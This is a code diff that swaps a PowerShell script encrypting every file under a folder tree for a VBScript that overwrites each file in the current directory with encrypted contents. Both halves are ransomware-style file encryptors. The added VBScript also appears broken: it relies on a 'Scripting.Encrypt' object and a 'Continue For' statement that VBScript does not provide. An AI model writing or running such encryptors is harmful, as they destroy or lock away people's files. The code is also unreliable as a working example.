@@ -1,20 +1,23 @@
-$files = Get-ChildItem -File -Recurse
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set objCrypto = CreateObject("Scripting.Encrypt")
 
-$filesToEncrypt = $files | Where-Object { $_.Name -ne "your file here" }
-
-$filesToEncrypt | ForEach-Object {
-    $file = $_
-    $key = [System.Convert]::ToBase64String([System.Security.Cryptography.ProtectedData]::GenerateRandom(32))
-    $keyFilePath = "thekey.key"
-    $encryptedFilePath = $file.FullName + ".encrypted"
-
-    # Write the encryption key to the key file
-    Set-Content -Path $keyFilePath -Value $key -Encoding Byte
-
-    # Read and encrypt the file contents
-    $content = Get-Content -Path $file.FullName -Encoding Byte
-    $encryptedContent = [System.Security.Cryptography.ProtectedData]::Protect($content, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-
-    # Write the encrypted contents to a new file
-    Set-Content -Path $encryptedFilePath -Value $encryptedContent -Encoding Byte
-}
+' Collect file names in the current directory
+For Each objFile In objFSO.GetFolder(".").Files
+    ' Skip encryption for the script file itself
+    If objFile.Name = WScript.ScriptName Then
+        Continue For
+    End If
+    
+    ' Read the file contents
+    Set objTextFile = objFSO.OpenTextFile(objFile.Path)
+    contents = objTextFile.ReadAll
+    objTextFile.Close
+    
+    ' Encrypt the file contents
+    encryptedContents = objCrypto.Encrypt(contents)
+    
+    ' Write the encrypted contents back to the file
+    Set objEncryptedFile = objFSO.CreateTextFile(objFile.Path, True)
+    objEncryptedFile.Write encryptedContents
+    objEncryptedFile.Close
+Next
